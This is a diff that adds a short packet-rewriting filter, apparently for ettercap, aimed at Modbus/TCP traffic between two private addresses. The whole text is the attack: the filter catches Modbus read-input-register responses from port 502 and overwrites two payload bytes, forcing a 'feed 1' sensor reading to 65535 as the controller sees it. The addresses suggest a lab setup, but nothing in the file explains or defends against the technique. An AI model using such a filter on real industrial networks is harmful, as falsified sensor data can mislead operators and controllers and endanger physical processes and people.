@@ -1,0 +1,9 @@
+# manipulate feed 1 sensor reading to 65535
+
+if (ip.src == '192.168.95.10' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+
+	DATA.data + 11 = 0xff;
+        DATA.data + 12 = 0xff;
+    }
+}
